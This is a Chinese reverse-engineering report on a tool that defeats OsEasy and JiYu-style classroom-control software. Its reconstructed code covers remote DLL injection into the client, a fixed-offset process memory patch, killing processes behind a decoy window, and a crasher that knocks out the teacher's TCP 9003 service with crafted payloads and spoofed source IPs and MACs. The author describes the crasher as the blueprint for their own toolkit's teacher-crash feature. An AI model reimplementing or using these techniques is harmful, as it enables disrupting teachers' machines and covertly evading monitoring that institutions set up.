# OSeasyPOC.exe 内嵌组件逆向分析报告

> 分析对象：`OSeasyPOC.exe`（25925240 字节，32 位 GUI，PyInstaller 打包外壳）
> 分析方法：MZ/PE 扫描 → 裁剪内嵌 PE → 服务器 Ghidra(blacktop/ghidra docker) 全函数/关键 API 反编译
> 分析日期：2026-09-10
> 环境：`/analyze/poc_re/`（服务器），Ghidra 项目 `pocproj`，脚本 `DumpAll.java`

---

## 0. 结论速览

`OSeasyPOC.exe` 是一个**多厂商「脱离课堂管控 / 摸鱼」工具**的打包体。它同时兼容 **噢易（OsEasy，`ScreenRender.exe`）** 和 **极域类（`VideoTechUi.exe` / `VideoTechConsole.exe`）** 两套教学客户端。

其架构为用户所述：**Python(tkinter) GUI 壳 + 多个独立 C 组件**。外壳（pe0）通过 PyInstaller 打包，各功能由独立 C 程序（pe1/pe2/pe6）承担，并内嵌了第三方 VNC 客户端（pe3）及 Python 运行时（pe4/pe5）。

**核心机制**：不走「修改命令行重跑」，而是**运行时进程注入 + 内存定点 patch / 杀进程**来解除管控。

---

## 1. 提取与组件清单

在原文件中扫描到 7 个合法 MZ+PE 镜像，逐一裁剪并分析：

| 编号 | 文件 | 偏移 | 架构 | 类型 | 大小 | 定性 |
|---|---|---|---|---|---|---|
| pe0_0.exe | pe0_0.exe | 0x0 | 32 | GUI EXE | ~25MB | **PyInstaller 外壳（tkinter 主界面）** |
| pe1_5e20.dll | pe1_5e20.dll | 0x5e20 | 32 | DLL | 52KB | **自动注入程序（hooksc DLL 注入器）+ 摸鱼助手** |
| pe2_412b0.dll | pe2_412b0.dll | 0x412b0 | 32 | DLL | 50KB | 摸鱼助手变体（杀进程 + 摸鱼窗口） |
| pe3_50b28.exe | pe3_50b28.exe | 0x50b28 | 64 | GUI EXE | 1.2MB | **TightVNC viewer（第三方 VNC 客户端）** |
| pe4_1873a0.exe | pe4_1873a0.exe | 0x1873a0 | 64 | console | 448KB | Python 运行时 / bootloader |
| pe5_18a9248.exe | pe5_18a9248.exe | 0x18a9248 | 64 | console | 26KB | **`oseasycrasher.exe` —— 崩溃教师端（资源 CRASHER）** |
| pe6_18afac0.exe | pe6_18afac0.exe | 0x18afac0 | 64 | GUI EXE | 24KB | **`bypassoss.exe` —— 内存定点 patch 绕过（"Pwned by phtcloud_dev"）** |

> 注：外壳 pe0 自身的 `.text` 仅约 11KB，`.rsrc` 占 25MB —— 是典型「瘦加载器 + 内嵌载荷」结构。

### 1.1 真正的内嵌载荷以「命名资源」方式存储（PE 资源解析出）

对 `.rsrc` 的 **IMAGE_RESOURCE 目录树**解析后，得到 6 个**命名资源**，各自是一份**未压缩的完整 PE**，由外壳用 `FindResourceA(hModule, ID, "TYPE")` 取出后释放到 `C:\Users\Public\` 再 `CreateProcessA` 拉起：

| 资源类型 | 资源ID | 文件偏移 | 大小 | 对应组件 | 落地路径 |
|---|---|---|---|---|---|
| **CRASHER** | 106 | 0x18a9248 | 26744 | **`oseasycrasher.exe`**（崩溃教师端） | `C:\Users\Public\oseasycrasher.exe` |
| **BYPASSOSS** | 108 | 0x18afac0 | 24696 | `bypassoss.exe`（内存 patch 绕过） | `C:\Users\Public\bypassoss.exe` |
| **HOOKSC** | 101 | 0x5e20 | 65144 | `hooksc.dll`（注入载荷） | `C:\Users\Public\hooksc.dll` |
| **SYSHOOKSC** | 103 | 0x412b0 | 63608 | `syshooksc.dll`（AppInit 注入） | `C:\Users\Public\syshooksc.dll` |
| **SCANER** | 105 | 0x1873a0 | 24MB | 扫描器（含嵌入大载荷） | `C:\Users\Public\oseasyscaner.exe` |
| **VNC** | 104 | 0x50b28 | 1271928 | TightVNC viewer（第三方） | — |

> 其余资源：`type=3` 为图标 PNG（7 张），`type=14`/`type=24` 为版本信息/XML 等。

---

## 2. pe1_5e20.dll —— 自动注入程序（核心：DLL 注入）

**身份**：32 位 DLL，含 `fullscreen` / `hooksc` 相关字符串，导入 `WriteProcessMemory / CreateRemoteThread / VirtualAllocEx / LoadLibraryA / SetWindowsHookExW / Process32NextW` 等。

### 2.1 `FUN_100011f0` —— 主注入入口

反编译核心逻辑（经整理）：

```c
if (running) {                          // 全局锁 DAT_1000e87c
    MessageBoxW(0, L"自动注入程序正在运行，请勿多次点击!", L"Error", 0x10);
    return 0;
}
running = 1;

snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
Process32FirstW(snapshot, &pe);          // 遍历所有进程
do {
    if (_wcsicmp(pe.szExeFile, L"VideoTechUi.exe") == 0)   // ← 目标进程
        break;
} while (Process32NextW(snapshot, &pe));

hProc = OpenProcess(0x1fffff, FALSE, pid);                 // 全权限打开
addr  = VirtualAllocEx(hProc, 0, 0x1b, MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProc, addr, "C:\\Users\\Public\\hooksc.dll", 0x1b, 0);
km    = GetModuleHandleW(L"kernel32.dll");
start = GetProcAddress(km, "LoadLibraryA");                // 注入目标 = LoadLibraryA
hThread = CreateRemoteThread(hProc, 0, 0, start, addr, 0, 0);
WaitForSingleObject(hThread, INFINITE);
// 写日志 C:\Users\Public\hooksclog.txt
```

**结论**：这是最标准的 `CreateRemoteThread + LoadLibraryA` 远程 DLL 注入，把 **`C:\Users\Public\hooksc.dll`** 注入进 **`VideoTechUi.exe`**（极域类客户端）。被注入的 `hooksc.dll` 才是真正改写窗口/解除管控的 hook 载荷。

### 2.2 `FUN_10001790` —— 按进程名终止

枚举进程，名字匹配即 `OpenProcess(1)` + `TerminateProcess(hProcess, 0)`，返回成功标志。即「杀掉指定名称进程」。

### 2.3 `FUN_10001a70` —— 创建窗口

经函数指针 `*DAT_1000ec3c`（实为 `CreateWindowExW`）创建窗口，样式 `param_4 | 0x40000`（`WS_CHILD`），并 `SetWindowTextW(hWnd, L"摸鱼助手窗口")`。

> 样式位 `0x40000` 为 `WS_CHILD`，配合 `width/2, height/2`，说明该窗口是**子窗口/克隆窗口**，用于「摸鱼」时显示一个替代窗口，让人看起来还在正常界面。

---

## 3. pe2_412b0.dll —— 摸鱼助手变体

与 pe1 同源的另一 DLL，功能更精简：

- `FUN_10001430`：与 pe1 的 `FUN_10001790` 相同——**枚举进程 + 名称匹配 + TerminateProcess**（杀进程）。
- `FUN_10001710`：与 pe1 的 `FUN_10001a70` 相同——创建 `SetWindowTextW(hWnd, L"摸鱼助手窗口")` 的子窗口。

即 pe2 是「杀客户端 + 伪装窗口」的独立摸鱼组件。

---

## 4. pe3_50b28.exe —— TightVNC viewer（第三方）

- 64 位 GUI，约 1.2MB。
- 字符串暴露：`C:\Users\phtcloud\Desktop\tightvnc-main\Release\x64\tvnviewer.pdb`，并含 `Seek/write/read temporary file`、`SystemParametersInfoW` 等 VNC 特征。
- 导入 `SetWindowsHookExW`（VNC 远程控制所需的全局键盘/鼠标挂钩），与屏幕广播无关。

**定性**：第三方 **TightVNC viewer**，是该工具「远程查看 / 对屏」功能内嵌的现成 VNC 客户端，非作者自研。

---

## 5. pe6_18afac0.exe —— 内存定点 patch 工具（"Pwned by phtcloud_dev"）

**这是最接近「旁路/破解」的组件**。

### `FUN_140001140` 反编译（整理）：

```c
hWnd = FindWindowA(0, <窗口标题DAT_140002290>);       // 按标题找目标窗口
if (hWnd) {
    GetWindowThreadProcessId(hWnd, &pid);
    if (pid) {
        if (FUN_140001000(pid, (uint64)lpdwProcessId) == 0) { ... }   // 定位内部偏移
        else {
            patch[0] = 0x6b2e9;                                     // 要写入的值
            hProc = OpenProcess(0x38 /*PROCESS_VM_OPERATION|VM_WRITE*/, 0, pid);
            WriteProcessMemory(hProc, (void*)(iVar1 + 0x54c13), &patch, 5, NULL);  // ← 定点写5字节
            MessageBoxA(0, "Pwned by phtcloud_dev", ...);           // 成功弹窗
        }
    }
}
```

**要点**：
- 按**窗口标题**找到目标进程（先 `FindWindowA`）。
- 在**目标进程内存 + 0x54c13 偏移**处，`WriteProcessMemory` 写 5 字节（值 `0x6b2e9`）。
- 弹窗 `Pwned by phtcloud_dev`（作者签名 phtcloud）。

**结论**：这是**跨进程单点内存补丁**——在目标程序某个固定偏移写一个标志值，以改变其运行时行为（关联前面 OsEasy 广播窗口化语境，很可能就是**把全屏/广播标志改成窗口化并解除锁定/解除应用保护**）。

---

## 6. pe0_0.exe —— PyInstaller 外壳

- 32 位 GUI，`.text` 仅 11KB，`.rsrc` 25MB。
- 含 `_MEIPASS` / `pyi-` / `python3.dll` / `pywintypes` 等 PyInstaller 特征。
- 代码区引用了 **`ScreenRender.exe`（OsEasy）** 与 **`VideoTechConsole.exe` / `VideoTechUi.exe`（极域）**，并含中文串 `摸鱼监视功能...有班级使用!`。

**定性**：多按钮 tkinter 启动器（用户所述 GUI 壳），运行时解包 Python 环境与各 C 组件并 `subprocess` 调用。**兼容 OsEasy + 极域两类环境**。

---

## 7. pe4 / pe5 —— Python 运行时 / 辅助

- pe4：64 位 console，Python 运行时（bootloader / python 模块区）。
- pe5：64 位小件，无关键 API 引用，属运行时库辅助。

---

## 8. 技术结论与对照

### 8.1 该作者「窗口化/脱离管控」实现方式

| 层 | 组件 | 手段 |
|---|---|---|
| 注入 | pe1 | `CreateRemoteThread + LoadLibraryA` 注入 `hooksc.dll` 到渲染/客户端进程 |
| Hook 载荷 | `hooksc.dll`（**打包在 Python 层，未单独抠出**） | 被注入后改写窗口样式/解除限制（待深挖其挂钩点） |
| 内存 patch | pe6 | `WriteProcessMemory(目标+0x54c13, 0x6b2e9, 5字节)` 定点改标志 |
| 杀进程 / 伪装窗口 | pe2 | `TerminateProcess` + 克隆"摸鱼助手窗口" |

### 8.2 与「argv 原生重跑」方案的对比

作者**没有**走改 `fullscreen` 参数重跑 ScreenRender 的 route，而是**直接对运行中的进程做 DLL 注入 + 内存补丁**，达到：

- 无需改名/替换 ScreenRender.exe（规避 MMPC 按固定名启动的限制）；
- 无需重新拉流（对已进入全屏的广播进程实时改造）；
- 用户此前关注的「纯内存劫持、不动原文件」正是此路。

**而我们的 `build_windowed_broadcast_cmd()`（fullscreen 改0重跑真 ScreenRender）= 原生窗口化**，结果等价（都是窗口渲染广播），但机制不同：一个重起新进程，一个改造既有进程。

### 8.3 关键待提取项

**`hooksc.dll`（真正改写窗口的 payload）仍压在 PyInstaller 存档里**，反向精确定位其挂钩点（`CreateWindowExW` / `ShowWindow` / 读写 `obj+0x844` 显示模式字段）需进一步从 pe0 的 CArchive 中解出并反编译。

> **更新（资源解析后）**：`hooksc.dll` 已作为命名资源 `HOOKSC`(0x5e20) 提取，实为「自动注入程序」本身。真正改窗口的 hook 载荷即该组件注入的 `hooksc.dll`/`syshooksc.dll`。

---

## 9. 崩溃教师端专项分析 —— `oseasycrasher.exe`（资源 CRASHER）

> 对应 toolkit 高级页「崩溃教师端」功能的**实现蓝本**。作为独立 exe 被外壳释放到 `C:\Users\Public\oseasycrasher.exe` 并以 `CreateProcessA` 拉起：`oseasycrasher.exe <教师机IP>`。

### 9.1 入口 `FUN_1400013f0`（main）

```
Made by phtcloud_dev
WSAStartup(0x202)
if argc<2 → "use: oseasycrasher.exe <ip>"
argv[1] = 教师机IP → "Kill target: %s"
"Sending Payload..."
循环 { 构造并发送载荷 ... }
```

### 9.2 载荷构造（核心算法）

1. 生成随机 5 个字母数字字符（`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789` 按 `rand()%0x3e` 取）；
2. 生成**随机伪造源 IP**（`%d.%d.%d.%d`）与**随机伪造 MAC**（`%02x:%02x:%02x:%02x:%02x:%02x`）；
3. 按 OsEasy `/` 分隔协议组装：
   ```
   /<rand1>/<rand2>/<rand3>//24/0/0/<spoofIP>/<spoofMAC>/
   ```
4. **逐字节转成十六进制**（`FUN_140001070`，hex 表 `DAT_140003584`，每字节→2 个 hex 字符）作为 TCP 载荷；
5. 再发第二个十六进制包：`180500002b000000400000000000000008050000 ffd8ffe0 0010464a464946...`（`ffd8ff` = JPEG SOI 头 + JT 头伪装探测包）。

### 9.3 发送函数 `FUN_140001130`

```c
sock = socket(AF_INET, SOCK_STREAM, 0);
addr  = { .family=AF_INET, .port=htons(0x232b /*9003*/), .addr=inet_addr(教师IP) };
connect(sock, &addr, 16);                    // ← TCP 连教师机 9003
send(sock, hexPayload, len);                  // 第一包：hex 编码的 /.../ 载荷
recv(sock, buf, 0x400);
send(sock, jpegHexPayload, len);              // 第二包：JPEG 头伪装包
recv(sock, buf, 0x400);
close(sock);
if (两次 recv 都 <=0)  → "[*]Detected abnormal data!" → 重新建socket再试
第二次 connect 失败 → "[!]Server is Crash! :)"（连接被拒=服务已崩）
              否则 → "[-]Server is still alive :("
```

### 9.4 结论

- **目标**：教师机 IP 的 **TCP 9003**（OsEasy 教师端服务端口）。
- **手法**：发送 **hex 编码的 OsEasy 协议 `/...//24/0/0/.../` 载荷**（内带随机 ID + 随机伪造源 IP/MAC 规避检测），配合 **JPEG 头伪装包**，促使教师端 9003 服务崩溃；以「连接被拒」判定成功。
- **与 toolkit 对应**：这正是 `teacher_control.py` 崩溃功能的实现蓝本——向教师端端口发送构造的管控/异常载荷。

---

## 附录：分析环境命令速查

```bash
# 裁剪 / 上传
python3 carv_all.py                  # 生成 ALL/pe{n}_{off}.{exe,dll}
scp ALL/*  root@45.207.220.121:/analyze/poc_re/

# 服务器 Ghidra 反编译
docker exec ghidra /ghidra/support/analyzeHeadless /projects pocproj \
  -import /samples/<file> -scriptPath /scripts -postScript DumpAll.java > /tmp/poc_peN.log
```
